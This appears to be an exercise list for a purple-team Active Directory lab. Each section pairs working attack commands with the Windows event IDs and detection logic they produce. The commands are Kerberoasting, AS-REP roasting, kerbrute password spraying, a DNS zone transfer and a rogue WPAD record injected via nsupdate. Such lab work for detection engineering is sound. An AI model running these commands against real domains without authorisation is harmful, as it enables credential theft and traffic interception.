# Exercises

What actually gets run against this lab.

---

**Privileged group audit**
```powershell
Get-ADGroupMember "Domain Admins" | Select-Object Name, objectClass
Get-ADGroupMember "Administrators" | Select-Object Name, objectClass
```
BadBlood plants a couple of shadow admins on population. They stay, on purpose.

---

**Kerberoasting**
```bash
impacket-GetUserSPNs corp.local/user -dc-ip 10.10.10.11 -request
```
```
EventID=4769, high volume, distinct SPNs, single source, short window
```

**AS-REP roasting**
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.11
```
```
EventID=4768, PreAuthType absent
```

---

**Password spraying, two speeds**
```bash
kerbrute passwordspray -d corp.local --dc 10.10.10.11 users.txt 'Spring2026!'                    # fast
kerbrute passwordspray -d corp.local --dc 10.10.10.11 --delay 8000 users.txt 'Spring2026!'        # slow
```
Both land as `4771`, not `4625` — Kerberos, not NTLM. Slow-spray detection is the harder rule: one source, many accounts, low per-account rate, over hours.

---

**DNS zone transfer**
```bash
dig axfr corp.local @10.10.10.11
```

**Rogue WPAD via dynamic update**
```bash
nsupdate
> server 10.10.10.11
> update add wpad.corp.local 600 A 10.10.10.30
> send
```
Check the Global Query Block List before assuming this worked.

---

**RMM daisy-chain**
```powershell
Get-CimInstance Win32_Service | Where-Object PathName -match 'vnc|anydesk|teamviewer|screenconnect'
```
Two different vendors on one host, one launched by the other, escalating to SYSTEM. Full detection logic: [rmm-multiplicity](https://github.com/purplepyram1d/rmm-multiplicity).

---

**Daily triage pass**
```bash
ip -br a && ss -tulpn && systemctl --failed && journalctl -p err --since today && df -h / && free -h
```
Six commands, under a minute, on the SIEM host. Same reflex on the Windows side: service health, `dcdiag /q`, time sync — the fast version of "is anything on fire."
